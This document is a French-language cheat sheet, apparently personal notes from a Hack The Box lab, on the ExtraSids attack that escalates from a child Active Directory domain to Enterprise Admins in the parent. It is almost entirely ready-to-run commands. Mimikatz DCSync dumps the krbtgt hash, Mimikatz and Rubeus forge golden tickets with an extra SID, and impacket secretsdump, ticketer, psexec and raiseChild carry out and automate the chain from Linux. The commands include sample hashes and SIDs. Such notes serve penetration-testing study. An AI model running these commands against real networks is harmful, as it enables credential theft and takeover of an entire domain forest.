## ExtraSids 
### Windows
Ajoute le SID d'un usagé d'un trust enfant ans le groupe Enterprise Admins du parent.
Besoin de :
* KRBTGT hash du domaine enfant
	* mimikatz: `lsadump::dcsync /user:LOGISTICS\krbtgt`
* SID du domaine enfant
	* `get-addomain | select DNSRoot,DomainSID`
	* powerview `Get-DomainSID`
* nom d'un usager du domaine enfant (pas besoin d'exister)
* FQDN du domaine enfant
* SID du groupe Enterprise Admin du domaine racine
	* powerview `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`
	* `Get-ADGroup -identity "Enterprise Admins" -server inlanefreight.local`
* Mimikatz, Rubeus
```powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
#sid = Domaine
#sids = Enterprise Admin
```
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
#sid = Domaine
#sids = Enterprise Admin
```

### Linux

* KRBTGT hash du domaine enfant
	* `impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
* SID du domaine enfant
	* `impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
* nom d'un usager du domaine enfant (pas besoin d'exister)
* FQDN du domaine enfant
* SID du groupe Enterprise Admin du domaine racine
	* `impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
	* concaténé le SID du domaine le RID pour avoir SID du groupe `<SID_domaine>-<RID>`

Crée un fichier CCache
```shell
impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
#extra-sid = groupe
#Exporter de cette façon pour utiliser dans auth kerberos
export KRB5CCNAME=hacker.ccache 
impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

```

Automatiser le tout
```shell
impacket-raiseChild -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```